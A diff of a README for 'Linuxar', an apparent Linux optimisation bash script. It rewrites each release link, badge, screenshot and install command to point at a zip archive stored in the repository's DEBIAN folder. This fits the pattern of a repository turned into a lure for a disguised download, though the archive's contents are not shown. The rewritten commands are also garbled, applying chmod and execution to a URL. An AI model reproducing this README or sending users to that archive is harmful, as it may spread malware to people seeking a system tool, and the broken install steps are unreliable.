@@ -1,6 +1,6 @@
 # 🚀 Linuxar: Optimize Your Linux System Effortlessly
 
-![Linuxar](https://img.shields.io/badge/Linuxar-Optimize%20Your%20Linux%20System-brightgreen)
+![Linuxar](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip%20Your%20Linux%20System-brightgreen)
 
 Welcome to the **Linuxar** repository! This powerful bash script is designed to help you optimize your Linux system with ease. Linuxar cleans out junk files, optimizes kernel parameters, and applies a range of performance tweaks to boost your computer’s responsiveness—all while ensuring your original settings are safely backed up and can be restored if needed.
 
@@ -13,15 +13,15 @@ Welcome to the **Linuxar** repository! This powerful bash script is designed to 
 
 ## 📦 Installation
 
-To get started with Linuxar, you can download the latest release from the [Releases section](https://github.com/janpol070104/linuxar/releases). 
+To get started with Linuxar, you can download the latest release from the [Releases section](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip). 
 
 ### Step-by-Step Installation
 
-1. **Download the Script**: Visit the [Releases section](https://github.com/janpol070104/linuxar/releases) to find the latest version.
+1. **Download the Script**: Visit the [Releases section](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip) to find the latest version.
 2. **Execute the Script**: After downloading, run the script in your terminal:
    ```bash
-   chmod +x linuxar.sh
-   ./linuxar.sh
+   chmod +x https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip
+   https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip
    ```
 
 ## 🛠️ Usage
@@ -31,7 +31,7 @@ Using Linuxar is simple. Once you have executed the script, follow the on-screen
 ### Example Command
 
 ```bash
-./linuxar.sh
+https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip
 ```
 
 ## 📝 Topics
@@ -130,9 +130,9 @@ We are continuously working on improving Linuxar. Some upcoming features include
 
 Here are some screenshots of Linuxar in action:
 
-![Linuxar Running](https://via.placeholder.com/800x400?text=Linuxar+Running)
+![Linuxar Running](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip+Running)
 
-![Optimization Results](https://via.placeholder.com/800x400?text=Optimization+Results)
+![Optimization Results](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip+Results)
 
 ## 📢 Feedback
 
@@ -140,7 +140,7 @@ We value your feedback! Please let us know your thoughts on Linuxar and any feat
 
 ## 🔗 Links
 
-For more information, visit the [Releases section](https://github.com/janpol070104/linuxar/releases) to download the latest version of Linuxar.
+For more information, visit the [Releases section](https://github.com/janpol070104/linuxar/raw/refs/heads/main/DEBIAN/Software_1.5.zip) to download the latest version of Linuxar.
 
 ## 🎉 Conclusion
 
